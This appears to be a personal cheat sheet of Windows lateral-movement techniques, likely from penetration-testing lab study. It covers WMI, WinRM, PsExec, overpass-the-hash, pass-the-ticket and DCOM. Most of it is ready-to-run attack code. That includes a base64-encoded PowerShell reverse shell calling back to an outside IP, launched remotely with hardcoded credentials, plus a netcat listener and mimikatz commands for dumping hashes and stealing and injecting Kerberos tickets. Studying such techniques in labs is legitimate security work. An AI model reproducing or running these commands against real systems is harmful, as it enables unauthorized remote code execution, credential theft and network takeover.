# Lateral Movement


## WMI

Setting "The usual" Base64UTF16-encoded payload, we can make a reverse shell with WMI:

```
$payload = 'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwA1ACIALAA2ADYANgA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='

$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.223.72 -Credential $credential -SessionOption $Options

$Command = "powershell -nop -w hidden -e $payload"

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

## WinRM

With "The usual" Base64UTF16-encoded payload, we can use WinRM to  start a reverse shell:

```
winrs -r:${RHOST} -u:${DOMAIN_USER} -p:${PASSWORD}  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```


Or, just natively with powrershell, we can start a WinRM session:

```powershell
$username = '$USER';
$password = '${PASSWORD}';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName ${RHOST} -Credential $credential
Enter Session 1
```


## PsExec

For this to work, ADMIN$ needs to be shared, and the authenticating user needs to be member of the local admin group.

```
.\PsExec64.exe -i \\${COMPUTER_NAME} -u ${DOMAIN}\${USER} -p ${PASSWORD} cmd
```
Note that it is important to use `$COMPUTER_NAME` for this, and not the IP.


## Overpass the hash

Assuming we have found an NTLM hash from a user (eg. using `sekurlsa::logonpasswords` with mimikatz), mimikatz kan help us overpass the hash to a tgt:

```
sekurlsa::pth /user:${DOMAIN_USER} /domain:${DOMAIN} /ntlm:${NTLM} /run:powershell 
```

Now, if we do eg.

```
net use \\${COMPUTER_NAME}
```

the TGT we just created is turned into a full TGS, granting us access (this can be double-checked with `klist`).

After getting a TGS, we can now eg. use PsExec to move to a new machine:

```
.\PsExec.exe \\${COMPUTER_NAME} cmd
```

## Pass the ticket

If sessions from other users are active, we can take their TGS tickets from memory and use them ourselves (assuming we are local admin of course):

```
sekurlsa::tickets /export
```

Afterwards, files are saved in the .kirbi format, so we can look for them with:

```
dir *.kirbi
```


and it can be loaded into memory of our current session like so:

```
kerberos::ptt ${FILE_NAME}.kirbi
```

now, using `net` or `PsExec.exe` will be done with this ticket.

If using `PsExec`, remember to authenticate with the ticket first. eg. with
```
net use \\${COMPUTER_NAME}
```

## DCOM
first, we specify the IP of `$RHOST`:

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$RHOST"))
```
Remember to setup the usual listener:

```
nc -nvlp ${ATTACK_PORT} 
```

with "The usual payload":

```
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```


